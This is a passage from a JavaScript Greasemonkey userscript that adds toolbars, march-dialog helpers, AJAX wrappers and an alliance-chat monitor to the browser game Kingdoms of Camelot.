			if (Options.pbChatOnRight==true) a.setAttribute("style", "text-decoration: none; font-weight:bold; color:#FFF; font-variant:small-caps; ");
			if (Options.pbChatOnRight==false) a.setAttribute("style", "text-decoration: none; font-weight:bold; color:#FFF; font-variant:small-caps; ");
			if (id) a.setAttribute("id", id);
			var span = document.createElement('span');
			span.setAttribute("style", comTabButtonStyle);
			a.appendChild(span);
			span.appendChild(document.createTextNode(caption));
			return a;
		},

		/// <summary>Creates a blue tab </summary>
		BlueTab: function (caption, onclick, id) {
			var a = document.createElement('a');
			if (typeof (onclick) == "string") { a.setAttribute("onclick", onclick); }
			else if (typeof (onclick) == "function") { a.addEventListener("click", onclick, true); }
			else throw "Invalid argument!";
			a.setAttribute("class", "tab");
			if (id) a.setAttribute("id", id);
			var span = document.createElement('span');
			a.appendChild(span);
			span.appendChild(document.createTextNode(caption));
			return a;
		},

		/// <summary>Creates a green button </summary>
		GreenButton: function (caption, onclick, id) {
			var a = document.createElement('a');
			if (typeof (onclick) == "string") { a.setAttribute("onclick", onclick); }
			else if (typeof (onclick) == "function") { a.addEventListener("click", onclick, true); }
			else throw "Invalid argument!";
			a.setAttribute("class", "buttonGreen20");
			a.setAttribute("href", "#");
			if (id) a.setAttribute("id", id);
			var span = document.createElement('span');
			a.appendChild(span);
			span.appendChild(document.createTextNode(caption));
			return a;
		},

		Span: function (innerHtml, id) {
			var span = document.createElement('span');
			span.innerHTML = innerHtml;
			if (id) a.setAttribute("id", id);
			return span;
		},

		Element: function (elementName, innerElement) {
			var elmt = document.createElement(elementName);
			if (typeof (innerElement) == "object") elmt.appendChild(innerElement);
			else if (typeof (innerElement) == "string") elmt.innerHTML = innerElement;
			else throw "Invalid Argument!";
			return elmt;
		},

		remove: function (id) {
			var elmt = document.getElementById(id);
			if (!elmt) return;
			elmt.parentNode.removeChild(elmt);
		},

		//TODO KSX remove function or KoC dependency!
		showDialog: function (header, content) {
			var template = " \
	<div id='modalBox2' class='modalBox modalBox400 ' style='width: 416px; top: 150px; \
		left: 172px; z-index: 100310;'> \
		<div id='modalInner2' class='modalInner modalInner400'> \
			<div id='modalTitleBar2' class='modalTitleBar modalTitleBar400'> \
				<div id='modalTitle2' class='modalTitle'> \
					${Header} \
				</div> \
				<div id='modalControls2' class='modalControls'> \
					<a id='modalControlsClose2' onclick='ksx.Builder.remove(\"modalBox2\");return false;'><span>&nbsp;</span> </a> \
				</div> \
			</div> \
			<div id='modalContent2' class='modalContent modalContent400'> \
				<div class='kofcalert'> \
					${Content} \
				</div> \
				<div class='kofcalertbtn clearfix'> \
					<a class='button20' onclick='ksx.Builder.remove(\"modalBox2\");return false;'><span>Ok</span> </a> \
				</div> \
			</div> \
		</div> \
	</div>";

			var s = template.replace("${Header}", header).replace("${Content}", content);
			document.body.appendChild(ksx.Builder.Element("div", s));
		},

		className: "KSX.Builder"
	};
	this.Builder = builder;
	
	/// <summary> Provides KoC specific stuff </summary>
	this.koc = {
		_ServerID: null,
		getServerId: function () {
			if (this._ServerID == null) {
				var m = /^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
				if (m)
					this._ServerId = m[1];
				else
					this._ServerId = '??';
			}
			return this._ServerId;
		},

		_PlayerName: null,
		getPlayerName: function () {
			///*DEBUGCODE:*/alert("Calling ksx.koc.getPlayerName");
			if (this._PlayerName == null) {
				var e = tools.getElement("topnavDisplayName");
				///*DEBUGCODE:*/if (e == null) alert("topnavDisplayName not found!");
				this._PlayerName = e.textContent;
			};
			return this._PlayerName;
		},

		getRallyPointLevel: function (cityId, returnLogicalLevel) {
			if (!cityId) cityId = unsafeWindow.currentcityid;
			else if (city.indexOf("city") != 0) cityId = "city" + cityId;
			if (!returnLogicalLevel) returnLogicalLevel = false;
			var seed = unsafeWindow.seed;
			var rallypointLevel = 0;
			for (var o in seed.buildings[cityId]) {
				if (parseInt(seed.buildings[cityId][o][0]) == 12) {
					rallypointLevel = parseInt(seed.buildings[cityId][o][1]);
					break;
				}
			}
			if (returnLogicalLevel && rallypointLevel == 11) rallypointLevel = 15;
			return rallypointLevel;
		},

		getCurrentCityId: function () {
			return unsafeWindow.currentcityid; //"city12345567"
		},

		getCurrentMarchType: function () {
			for (var i = 1; i < 6; i++) if (document.getElementById('modal_attack_tab_' + i).className == 'selected') return i;
			return 0;
		},

		// Provides a wrapper for the KoC march popup
		MarchUI: function () {
			try {
				for (var i = 1; i <= 12; i++) {
					// this.unitIpt? = ksx.tools.getElement("modal_attack_unit_ipt?");
					var elmt1 = ksx.tools.getElement("modal_attack_unit_ipt" + i, true);
					this["unitIpt" + i] = elmt1;

					// this.unitnum? = ksx.tools.getElement("//div[@id='modal_attack_unitlist']/div[@name='?']/div/div[2]/span");
					var elmt2 = ksx.tools.getElement("//div[@id='modal_attack_unitlist']/div[@name='" + i + "']/div/div[2]/span", true);
					this["unitnum" + i] = elmt2;
					
					this["unitAvail" + i] = Number(elmt2.textContent);
				}

				var map = [
					["modal_attack_knight", "knight"],
					["modal_attack_target_coords_x", "targetCoordsX"],
					["modal_attack_target_coords_y", "targetCoordsY"],
					["modal_attack_supplyfilter_checkbox", "supplyfilterCheckbox"],
					["modal_attack_gold", "gold"],
					["modal_attack_rec1", "food"], // nahrung
					["modal_attack_rec2", "wood"],  // holz,
					["modal_attack_rec3", "stone"],// stein
					["modal_attack_rec4", "ore"],  // erz				   
				];
				for (i = 0; i < map.length; i++) {
					var elmt = ksx.tools.getElement(map[i][0], true);
					this[map[i][1]] = elmt;
				}

				this.maxGoldValue = ksx.tools.getElement("modal_attack_rec_max_gold", true).textContent;
				this.maxFoodValue = ksx.tools.getElement("modal_attack_rec_max_rec1", true).textContent;
				this.maxWoodValue = ksx.tools.getElement("modal_attack_rec_max_rec2", true).textContent;
				this.maxStoneValue = ksx.tools.getElement("modal_attack_rec_max_rec3", true).textContent;
				this.maxOreValue = ksx.tools.getElement("modal_attack_rec_max_rec4", true).textContent;

				this.maxUnit = ksx.tools.getElement("modal_attack_maxunt", true);
				this.maxRes = ksx.tools.getElement("modal_attack_maxres", true);

				this.getMarchType = function () {
					for (i = 1; i < 6; i++) if (ksx.tools.getElement('modal_attack_tab_' + i, true).className == 'selected') return i;
					return 0;
				};
			} catch (e) {
				GM_log("ERROR: MarchUI - " + e);
				throw e;
			}

		},

		getCityBuilding: function getCityBuilding(cityId, buildingId) {
			var b = unsafeWindow.seed.buildings['city' + cityId];
			var ret = { count: 0, maxLevel: 0 };
			for (var i = 1; i < 33; i++) {
				if (b['pos' + i] && b['pos' + i][0] == buildingId) {
					++ret.count;
					if (parseInt(b['pos' + i][1]) > ret.maxLevel)
						ret.maxLevel = parseInt(b['pos' + i][1]);
				}
			}
			return ret;
		},

		getMyAlliance: function () {
			if (unsafeWindow.seed.allianceDiplomacies == null || unsafeWindow.seed.allianceDiplomacies.allianceName == null)
				return [0, ''+culang.none+''];
			else
				return [unsafeWindow.seed.allianceDiplomacies.allianceId, unsafeWindow.seed.allianceDiplomacies.allianceName];
		},

		getAllianceId: function () {
			if (unsafeWindow.seed.allianceDiplomacies == null || unsafeWindow.seed.allianceDiplomacies.allianceName == null)
				return 0; else return unsafeWindow.seed.allianceDiplomacies.allianceId;
		},

		getLanguage:function () {
			var t=ksx.tools.getElement("//div[@id='mod_untqueue']/div/span",true).textContent;
			switch (t) {
				case SR.en.koc_TroopActivity:lang='en'; // English  en
				case SR.de.koc_TroopActivity:lang='de'; // German   de
				case SR.fr.koc_TroopActivity:lang='fr'; // French   fr
				case SR.it.koc_TroopActivity:lang='it'; // Italian  it
				case SR.tr.koc_TroopActivity:lang='tr'; // Turkish  tr
				case SR.es.koc_TroopActivity:lang='es'; // Spanish  es
				case SR.se.koc_TroopActivity:lang='se'; // Swedish  se   Svenska
				case SR.nl.koc_TroopActivity:lang='nl'; // Dutch    nl   Nederlands
				default                     : return 'en';
			}
		},
		
		// works with greasmonkey, but not compatible with JScript (VS)
		// get lang (){return this.getLanguage();},
		lang: "en",

		// Power v0.6.6
		AjaxRequest: function (url, opts) {
			var headers = {
				'X-Requested-With': 'XMLHttpRequest',
				'X-Prototype-Version': '1.6.1',
				'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
			};
			var ajax = null;

//			if (DEBUG_TRACE_AJAX) logit("AJAX: " + url + "\n" + inspect(opts, 3, 1));

			if (window.XMLHttpRequest) ajax = new XMLHttpRequest();
			else ajax = new ActiveXObject("Microsoft.XMLHTTP");

			if (opts.method == null || opts.method == '') method = 'GET';
			else method = opts.method.toUpperCase();

			if (method == 'POST') {
				headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
			} else if (method == 'GET') {
				addUrlArgs(url, opts.parameters);
			}

			ajax.onreadystatechange = function() {
				//  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
				if (ajax.readyState == 4) {
					if (ajax.status >= 200 && ajax.status < 305)
						if (opts.onSuccess) opts.onSuccess(ajax);
						else if (opts.onFailure) opts.onFailure(ajax);
				} else {
					if (opts.onChange) opts.onChange(ajax);
				}
			};
			ajax.open(method, url, true); // always async!

			for (var k in headers) ajax.setRequestHeader(k, headers[k]);
			if (ksx.tools.typeOf(opts.requestHeaders) == 'object') for (var k in opts.requestHeaders) ajax.setRequestHeader(k, opts.requestHeaders[k]);

			if (method == 'POST') {
				var a = [];
				for (k in opts.parameters) a.push(k + '=' + opts.parameters[k]);
				ajax.send(a.join('&'));
			} else {
				ajax.send();
			}
		},

		// Power v0.6.6
		MyAjaxRequest: function (url, o, noRetry) {
//			if (DEBUG_TRACE) logit(" 0 myAjaxRequest: " + url + "\n" + inspect(o, 2, 1));
			var opts = unsafeWindow.Object.clone(o);
			var wasSuccess = o.onSuccess;
			var wasFailure = o.onFailure;
			var retry = 0;
			var delay = 5;
			var noRetry = noRetry === true ? true : false;
			opts.onSuccess = mySuccess;
			opts.onFailure = myFailure;

//			if (DEBUG_TRACE) logit(" 1a myAjaxRequest: " + url + "\n" + inspect(o, 2, 1));
			new ksx.koc.AjaxRequest(url, opts);
			return;

			function myRetry() {
				++retry;
				new ksx.koc.AjaxRequest(url, opts);
				delay = delay * 1.25;
			}

			function myFailure() {
				var o = { };
//				if (DEBUG_TRACE) logit("myAjaxRequest.myFailure(): " + inspect(rslt, 1, 1));
				o.ok = false;
				o.errorMsg = "AJAX Communication Failure";
				wasFailure(o);
			}

			function mySuccess(msg) {
				var rslt = eval("(" + msg.responseText + ")");
				var x;
				if (rslt.ok) {
//					if (DEBUG_TRACE) logit(" 1b myAjaxRequest.mySuccess(): " + inspect(rslt, 1, 1));
					rslt.errorMsg = null; ///// !!!!!!!!!!!!!  ************
					if (rslt.updateSeed) unsafeWindow.update_seed(rslt.updateSeed);
					wasSuccess(rslt);
					return;
				}
//				if (DEBUG_TRACE) logit(" 1b myAjaxRequest.mySuccess() !ok : " + inspect(rslt, 3, 1));
				rslt.errorMsg = unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
				if ((x = rslt.errorMsg.indexOf('<br><br>')) > 0) rslt.errorMsg = rslt.errorMsg.substr(0, x - 1);
				if (!noRetry && (rslt.error_code == 0 || rslt.error_code == 8 || rslt.error_code == 1 || rslt.error_code == 3)) {
					dialogRetry(rslt.errorMsg, delay, function() {
						myRetry();
					}, function() {
						wasSuccess(rslt);
					});
				} else {
					wasSuccess(rslt);
				}
			}
		},
		
		// Power 0.6.6
		inspect:function (obj, maxLevels, level, doFunctions) {
			var str = '', type, msg;
			if (level == null) level = 0;
			if (maxLevels == null) maxLevels = 1;
			if (maxLevels < 1) return 'Inspect Error: Levels number must be > 0';
			if (obj == null) return 'ERROR: Object is NULL\n';
			var indent = '';
			for (var i = 0; i < level; i++) indent += '  ';
			for (var property in obj) {
				try {
					type = ksx.tools.typeOf(obj[property]);
					if (doFunctions == true && (type == 'function')) {
						str += indent + '(' + type + ') ' + property + "[FUNCTION]\n";
					} else if (type != 'function') {
						str += indent + '(' + type + ') ' + property + ((obj[property] == null) ? (': null') : ('')) + ' = ' + obj[property] + "\n";
					}
					if ((type == 'object' || type == 'array') && (obj[property] != null) && (level + 1 < maxLevels)) str += inspect(obj[property], maxLevels, level + 1, doFunctions); // recurse
				} catch(err) {
					// Is there some properties in obj we can't access? Print it red.
					if (typeof(err) == 'string') msg = err;
					else if (err.message) msg = err.message;
					else if (err.description) msg = err.description;
					else msg = 'Unknown';
					str += '(Error) ' + property + ': ' + msg + "\n";
				}
			}
			str += "\n";
			return str;
		},
		
		className: "ksx.koc"
	};

	this.plugins = {className: "ksx.plugins"};
	this.compatibility = { className: "ksx.compatibility" };
	this.configuration = { className: "ksx.configuration" };
	this.className = "KSX";

	/*DEBUGCODE:*/ this.logit("Current player: " + this.koc.getPlayerName());
};

function ToolbarPlugin(ksx) {

	var macros = {
		// contains all functions, which can be called from toolbar buttons
		
		dumpSeed: function () {
			function dump(obj,path) {
				for (var o in objs) {if(o===obj) return;} objs.push(obj);
				//if(ksxDebug) GM_log("dump " + path);
				
				for (var propName in obj) {
					var propPath = path + "." + propName;
					var propValue = obj[propName];
					
					if(propValue===null) {
						s += "" + propPath +" (undefinied): null" + "\n";
						return;
					}
					var propValueType = typeof propValue;
					switch (propValueType) {
						case "function":return;
						case "object": s += "" + propPath +" ("+ propValueType +"): >>" /*+ propValue.toString().substr(0,20)*/ + "\n";break;
						default:s += "" + propPath +" ("+ propValueType +"): "+ propValue.toString() + "\n";break;
					}
				
					if(obj.propertyIsEnumerable(propName) && !(typeof propValue === "string")) {
						++ind;dump(propValue,propPath);--ind;
					}
				}
			}
			var objs = [];
			var ind = 0;
			var s = "";
			dump(unsafeWindow.seed,"seed");
			//GM_log(s);
		},

		// opens the new message dialog
		newMessage: function () {
			if(ksxDebug) GM_log("Calling ksx.plugins.Toolbar.macros.newMessage()");
			ksx.tools.doUnsafeWindow("modal_messages(); track_chrome_btn('messages_btn'); modal_messages_compose();", true);
		},
		
		// opens the send to alliance dialog
		newMessageAtAlliance: function () {
			if(ksxDebug) GM_log("Calling ksx.plugins.Toolbar.macros.newMessageAtAlliance()");
			var doit = "getMessageWindow(" + ksx.koc.getAllianceId() + ",'Alliance Members','allianceall')";
			//if(ksxDebug) GM_log("doUnsafeWindow "+doit);
			ksx.tools.doUnsafeWindow(doit, true);
		},
		
		// opens the march dialog
		newMarch: function (marchType, x, y, troops, res) { ksx.plugins.MarchExtender.march.show(marchType, x, y, troops, res); },

		// template: function(){},

		className: "Macros"
	};
	this.macros = macros;

	this.initUI = function (thisPlugin) {
		if (ksxDebug) GM_log("Calling ToolbarPlugin.initUI");

		var fc = document.body.firstChild;

		var tbDiv = document.createElement('div');
		tbDiv.id = "ksx_ToolbarPlugin_ToolbarContainer";
		tbDiv.setAttribute("style", "line-height: 22px; font-size: small; text-align: left; border-bottom: 1px solid silver; height: 24px; width: 740px; background: none repeat scroll 0% 0% "+Colors.scToolbarBG+"; ");
		// div.style.width = '772px';
		// div.style.width = '1100px'; //+ Chat Rechts

		var lines = 1;
		for (var i = 0; i < ksx.configuration.toolbar.items.length; i++) {
			var item = ksx.configuration.toolbar.items[i];
			if (!item) continue; //skip empty item
			if (ksxDebug) GM_log("Create toolbar item: " + item);
			switch (item[0].toLowerCase()) {
				case "button": tbDiv.appendChild(ksx.Builder.ToolbarButton(item[2], item[3], item[1])); break;
				case "label": tbDiv.appendChild(ksx.Builder.Span(item[2])); break;
				case "html": tbDiv.appendChild(ksx.Builder.Span(item[1])); break;
				case "linebreak": lines++; tbDiv.appendChild(document.createElement("br")); break; //TODO 
				//				case "popup": break; //TODO              
				case "separator": tbDiv.appendChild(ksx.Builder.Span(" | ")); break;
				default: break;
			}
		}

		tbDiv.style.height = (lines * 22 + 4) + 'px';

		var toolbarsPanelDiv = document.getElementById("ksx_ToolbarPlugin_ToolbarsPanel");
		if (toolbarsPanelDiv == null) {
			toolbarsPanelDiv = document.createElement('div');
			toolbarsPanelDiv.id = "ksx_ToolbarPlugin_ToolbarsPanel";
			toolbarsPanelDiv.setAttribute("style", "margin: 1px 0pt 0pt 20px;");
			document.body.insertBefore(toolbarsPanelDiv, document.body.firstChild);
		}

		toolbarsPanelDiv.appendChild(tbDiv);
	};

	this.addToolbarItem = function(item) {
		var div = ksx.tools.getElement("ksx_ToolbarPlugin_ToolbarContainer");
		switch (item[0].toLowerCase()) {
			case "button": div.appendChild(ksx.Builder.BlueButton(item[1], item[2])); break;
			case "label" : div.appendChild(ksx.Builder.Span(item[1])); break;
			case "html"  : div.appendChild(ksx.Builder.Span(item[1])); break;
			default: break;
		}
	};

	this.initUI(this);
}

function PowerToolbarPlugin(ksx) {
	
	this.macros = { className: "PowerToolbarPlugin+Macros" };

	this.atSyncButtonClick = function (evt) {
		if (ksxDebug) GM_log("PowerToolbarPlugin.atSyncButtonClick");

		var t = ksx.tools.findParentByTagName(evt.target, "A", true);
		if (!t) { GM_log("Element for event not found!"); return; }

		var id = t.getAttribute("id");
		if (!id) { GM_log("ERROR: Element has no id!"); return; }
		for (var i = 0; i < ksx.configuration.powertoolbar.syncButtons.length; i++) {
			var cfg = ksx.configuration.powertoolbar.syncButtons[i];
			if (cfg[0] === id) {
				var pbButton = document.getElementById(cfg[1]);
				if (!pbButton) { GM_log("ERROR: Element not found! '" + cfg[1] + "'"); return; }
				if (ksxDebug) GM_log("Click: " + cfg[1]);
				ksx.tools.click(pbButton);
				return;
			}
		}
		GM_log("ERROR: Config not found! " + id); return;
	};

	this.updateButtons = function () {
		for (var i = 0; i < ksx.configuration.powertoolbar.syncButtons.length; i++) {
			var cfg = ksx.configuration.powertoolbar.syncButtons[i];
			var ksxpbButton = document.getElementById(cfg[0]);
			if (ksxpbButton) {
				var pbButton = document.getElementById(cfg[1]);
				if (pbButton) {
					ksx.Builder.setToolbarCheckButton(ksxpbButton, String(pbButton[cfg[2]]).search(cfg[3]) != -1);
				} else {
					ksx.Builder.setToolbarCheckButton(ksxpbButton, null);
				}
			}
		}
	};

	this.initUI = function (thisPlugin) {
		if (ksxDebug) GM_log("Calling PowerToolbarPlugin.initUI");

		var tbDiv = document.createElement('div');
		tbDiv.id = "ksx_PowerToolbarPlugin_ToolbarContainer";
		tbDiv.setAttribute("style", "line-height: 22px; font-size: small; text-align: left;  height: 24px; width: 750px; background: none repeat scroll 0% 0%  "+Colors.scToolbarBG2+";");
		// div.style.width = '772px';
		// div.style.width = '1100px'; //+ Chat Rechts

		var lines = 1;
		for (var i = 0; i < ksx.configuration.powertoolbar.items.length; i++) {
			var item = ksx.configuration.powertoolbar.items[i];
			if (!item) continue; //skip empty item
			if (ksxDebug) GM_log("Create toolbar item: " + item);
			switch (item[0].toLowerCase()) {
				case "button": tbDiv.appendChild(ksx.Builder.ToolbarButton(item[2], item[3], item[1])); break;
				case "label": tbDiv.appendChild(ksx.Builder.Span(item[2])); break;
				case "html": tbDiv.appendChild(ksx.Builder.Span(item[1])); break;
				case "linebreak": lines++; tbDiv.appendChild(document.createElement("br")); break; //TODO 
				//				case "popup": break; //TODO             
				case "separator": tbDiv.appendChild(ksx.Builder.Span(" | ")); break;
				default: break;
			}
		}
		tbDiv.style.height = (lines * 22 + 4) + 'px';

		var toolbarsPanelDiv = document.getElementById("ksx_ToolbarPlugin_ToolbarsPanel");
		toolbarsPanelDiv.appendChild(tbDiv);
	};

	this.addToolbarItem = function (item) {
		var div = ksx.tools.getElement("ksx_PowerToolbarPlugin_ToolbarContainer");
		switch (item[0].toLowerCase()) {
			case "button": div.appendChild(ksx.Builder.BlueButton(item[1], item[2])); break;
			case "label": div.appendChild(ksx.Builder.Span(item[1])); break;
			case "html": div.appendChild(ksx.Builder.Span(item[1])); break;
			default: break;
		}
	};

	this.updateTimer = function () {
		ksx.plugins.PowerToolbar.updateButtons();
	};

	this.initSync = function (thisPlugin) {
		for (var i = 0; i < ksx.configuration.powertoolbar.syncButtons.length; i++) {
			var cfg = ksx.configuration.powertoolbar.syncButtons[i];
			//GM_log("Init toolbarsync: " + cfg[0] + " " + cfg[1]);
			var tbButton = document.getElementById(cfg[0]);
			if (!tbButton) { GM_log("Element not found! '" + cfg[0] + "'"); }
			if (tbButton) { tbButton.addEventListener("click", thisPlugin.atSyncButtonClick, false); }
		}
	};
	this.className = "PowerToolbarPlugin";
	this.initUI(this);
	this.initSync(this);
	window.setInterval(this.updateTimer, 1000);
}

function ChatMonitorPlugin(ksx) {

	this.infoTokens = SR.getArray("ksx_ChatMonitor_InfoTokens",LangOptions.culang); //Spam vom KoC Power z.B.
	this.attackTokens = SR.getArray("ksx_ChatMonitor_AttackTokens",LangOptions.culang);

	this.hooks = [];

	this.AddHook = function (fnc) {
		this.hooks.push(fnc);
	};

	this.Filter = function (name, tokens, conditions, fnc) {
		this.name = name;
		this.tokens = tokens || [];
		this.conditions = conditions || {};
		this.fnc = fnc;
	};

	this.MsgDivWrapper = function (msgdiv) {
		this.msgdiv = msgdiv;
		this.msgType = "unknown"; this.isAlliance = false; this.isDirect = false; this.isNoAlliance = false; this.isGlobal = false;
		if (msgdiv.getAttribute("class") == "chatwrap clearfix") { this.msgType = "alliance"; this.isAlliance = true; }
		else if (msgdiv.getAttribute("class") == "chatwrap clearfix direct") { this.msgType = "direct"; this.isDirect = true; }
		else if (msgdiv.getAttribute("class") == "chatwrap clearfix noalliance") { this.msgType = "noalliance"; this.isNoAlliance = true; }
		else if (msgdiv.getAttribute("class") == "chatwrap clearfix global") { this.msgType = "global"; this.isGlobal = true; }

		if (!this.isNoAlliance) {
			var playerName = ksx.koc.getPlayerName();
			this.img = msgdiv.childNodes[0];
			this.contentDiv = msgdiv.childNodes[1];
			this.infoDiv = msgdiv.childNodes[1].childNodes[0];
			this.whoA = msgdiv.childNodes[1].childNodes[0].childNodes[0];
			this.saysB = msgdiv.childNodes[1].childNodes[0].childNodes[1];
			this.timeSpan = msgdiv.childNodes[1].childNodes[0].childNodes[3];
			this.clearfixDiv = msgdiv.childNodes[1].childNodes[1];
			this.tx = msgdiv.childNodes[1].childNodes[1].childNodes[0];

			this.isOwnEntry = (this.whoA.textContent == playerName);
			this.msgtxt = this.tx.textContent;
		} else {

		}
	};

	this.filters = [];

	//#region Feature: "Cheat Zeit Korrektur"
	this.chatEntryTimeCorrection = function (chatEntry) {
		//if(ksxDebug) GM_log("enableTimeCorrection: " + enableTimeCorrection);
		if (chatEntry.msgdiv.getAttribute("class") != "chatwrap clearfix" && chatEntry.msgdiv.getAttribute("class") != "chatwrap clearfix direct") return;

		var timeOffset = 9; // TODO read from Config
		var chhmm = ksx.tools.getElement("kochead_time").innerHTML.split(":");
		var cmmm = (60 * chhmm[0]) + (1 * chhmm[1]);

		var timeSpan = chatEntry.msgdiv.childNodes[1].childNodes[0].childNodes[3];
		var hhmm = timeSpan.innerHTML.split(":");
		var hh = (1 * hhmm[0]);
		var mmm = hh * 60 + (1 * hhmm[1]);

		if (Math.abs(cmmm - mmm) > 2) {
			hh += timeOffset; if (hh >= 24) hh -= 24; if (hh < 10) hh = "0" + hh;
			var newTime = hh + ":" + hhmm[1];
			//if(ksxDebug) GM_log("Chat entry: time correction: " + timeSpan.innerHTML + " + Offset " + timeOffset + "h = " + newTime);
			timeSpan.innerHTML = newTime;
		}

	};
	//#endregion
	
	this.scanChatItem = function (chatEntry, filter) {
		/*DEBUGCODE:*/if (ksxDebug) GM_log("ChatMonitorPlugin.scanChatItem()");
		
		var infoStyle ='';
		if (Options.pdxBackgroundStyle=="pdxKoCOld" /* && Options.pbChatOnRight==true*/ ) {
			infoStyle = "background: " + ksx.configuration.chat.backgrounds.InfoBackground;
		}else{
			infoStyle = "background-color: "+Colors.SpamBackground+"; -moz-box-shadow: 0 0 3px 2px "+Colors.SpamBackground+"; padding:8px; margin-Bottom:3px; -moz-border-radius:3px;";
			//funktioniert nicht
			//chatEntry.msgdiv.style.linkColor = '#333 !important'; //TODO PDX do it in style
		}
		
		var infoTokens = ksx.plugins.ChatMonitor.infoTokens;
//		var attackTokens = ksx.plugins.ChatMonitor.attackTokens; //KSX allways in [Power]

		if (chatEntry.token0 == infoTokens[0]) {
			/*DEBUGCODE:*/if (ksxDebug) GM_log("INFO token found");
			chatEntry.msgdiv.setAttribute("style", infoStyle);
			return true;
		}
//KSX allways in [Power]
//		  else if (chatEntry.token0 == attackTokens[0] && chatEntry.isOwnEntry) {
//			/*DEBUGCODE:*///if (ksxDebug) GM_log("ATTACK (own) token found");
//			var ownAttackStyle = "background: " + ksx.configuration.chat.backgrounds.OwnAttackBackground;
//			chatEntry.msgdiv.setAttribute("style", ownAttackStyle);
//			return true;
//		} else if (chatEntry.token0 == attackTokens[0] && !chatEntry.isOwnEntry) {
//			/*DEBUGCODE:*/ //if (ksxDebug) GM_log("ATTACK (alliance) token found");
//          var allyAttackStyle = "background: " + ksx.configuration.chat.backgrounds.AllyAttackBackground;
//			chatEntry.msgdiv.setAttribute("style", allyAttackStyle);
//			return true;
//		}
		return false;
	};

	this.scanAllianceChat = function () {
		/*DEBUGCODE:*/if(ksxDebug) GM_log("ChatMonitorPlugin.scanAllianceChat");

		function setEntryHandled(info) {
			if(typeof(info)!=="unspecified" && info!==null) info=" ("+info+")";
			msgdiv.innerHTML += "<div style='display:none'>Entry processed by ChatMonitorPlugin"+info+"</div>";
		}

		var modCommList2 = ksx.tools.getElement("mod_comm_list2");
		for (var i = 0; i < modCommList2.childNodes.length; i++) {
			var msgdiv = modCommList2.childNodes[i];
			var t=msgdiv.textContent;
			if (t.indexOf("Entry processed by ChatMonitorPlugin")>=0) return; //allready handled item found => exit loop
			var chatEntry = new ksx.plugins.ChatMonitor.MsgDivWrapper(msgdiv);

			if (chatEntry.isNoAlliance) { setEntryHandled(); continue; }

			//#region Feature: "Cheat Zeit Korrektur"
			if (ksx.configuration.chat.enableTimeCorrection) {
				ksx.plugins.ChatMonitor.chatEntryTimeCorrection(chatEntry, null);
			}
			//#endregion

			var token = null; var token0 = null; var filter = null;
			for (var k = 0; k < ksx.plugins.ChatMonitor.filters.length; k++) {
				token = null; token0 = null; filter=null;
				var f = ksx.plugins.ChatMonitor.filters[k];
				// /*DEBUG*/ GM_log("Checking filter: [" + k + "].name: " + f.name);
				for (var j = 0; j < f.tokens.length; j++) {
					var t = f.tokens[j];
					var isRegExp = (t.match(/^.*\/[gim]*$/)) != null;
					//GM_log("\"" + t + "\" is regexp " + isRegExp);
					if (isRegExp) var tg = t.match(/[gim]*$/);
					if (isRegExp) t = t.replace(/^\//, "").replace(/\/[gim]*$/, "").replace("\\", "\\\\");
					//if (isRegExp) GM_log("new RegExp(\"" + (t || "") + "\",\"" + (tg || "") + "\")");
					if (isRegExp) {
						var regexp = new RegExp((t || ""), (tg || ""));
						var match = chatEntry.msgtxt.match(regexp);
						if (match) {
							filter=f;
							token = f.tokens[j];
							token0 = f.tokens[0];
							if(ksxDebug) GM_log("match: " + match + " in \"" + chatEntry.msgtxt +"\"");
						} else {
							if(ksxDebug) GM_log("No match in \"" + chatEntry.msgtxt + "\"");
						}
					} else if (chatEntry.msgtxt.indexOf(t) == 0) {
						filter = f;
						token = f.tokens[j];
						token0 = f.tokens[0];
					}
//					if (typeof t === "string" && chatEntry.msgtxt.indexOf(t) == 0) {
//						token = filter.tokens[j];
//						token0 = filter.tokens[0];
//					} else if (t instanceof RegExp && chatEntry.msgtxt.match(t) != null) {
//						token = filter.tokens[j];
//						token0 = filter.tokens[0];
//					}
					if (token != null) break;
				}
				if (token != null) break;
			}
			if (!token) {
				setEntryHandled();
				//if(thisPlugIn.logFilter) GM_log("No token found. filters: (" + ksx.plugins.ChatMonitor.filters.length + ")"); 
				continue;
			}
			chatEntry.token0 = token0;
			chatEntry.token = token;

			/*DEBUGCODE:*/if (ksxDebug) GM_log("Chat token found: " + chatEntry.token + " isOwnEntry: " + chatEntry.isOwnEntry + " context: " + chatEntry.msgType);

			var entryHandled = false;
			for (var k = 0; k < ksx.plugins.ChatMonitor.filters.length; k++) {
				var f = ksx.plugins.ChatMonitor.filters[k];
				//GM_log("Checking filter: [" + k + "].name: " + f.name + " tokens: " + f.tokens + " isOwnEntry: " + f.conditions.isOwnEntry);
				if (!f.tokens) continue;
				if (f.tokens[0] != token0) continue;
				if (!(typeof f.conditions.isOwnEntry === "undefined") && !(f.conditions.isOwnEntry === null) && f.conditions.isOwnEntry != chatEntry.isOwnEntry) continue;

				entryHandled = f.fnc(chatEntry, f);
				if (entryHandled) { entryHandled = true; setEntryHandled(); return; }
			}

			//special case, no token, must be allways the last
			if (entryHandled && chatEntry.isOwnEntry) {
				(function () {
					var ownStyle = "color:#FFF; background-color: #333; -moz-box-shadow: 0 0 3px 2px #333; padding:8px; margin-Bottom:3px; -moz-border-radius:3px;";
					chatEntry.msgdiv.setAttribute("style", ownStyle);
				})();
				setEntryHandled();
				continue;
			}

			setEntryHandled();
		}
	};
	
	var filters = this.filters;
	var Filter = this.Filter;
	filters.push(new Filter('infoTokens', this.infoTokens, {}, this.scanChatItem));
//	filters.push(new Filter('attackTokens', this.attackTokens, {}, this.scanChatItem)); //allways in [Power]

	if (ksxDebug) GM_log("setInterval scanAllianceChat");
	window.setInterval(this.scanAllianceChat, 5000);
}

function ResourceRequestPlugin(ksx) {
	//REQUIRES ChatMonitorPlugin, MarchExtenderPlugin
	var thisPlugin = this;
	this.className = "ResourceRequestPlugin";
	
	var lang = LangOptions.culang;//ksx.koc.lang
	var acknowledgeTokens = SR.getArray("ksx_ResourceRequest_AcknowledgeTokens",lang);
	var requestTokens     = SR.getArray("ksx_ResourceRequest_RequestTokens"    ,lang);
	var deliveryTokens    = SR.getArray("ksx_ResourceRequest_DeliveryTokens"   ,lang);
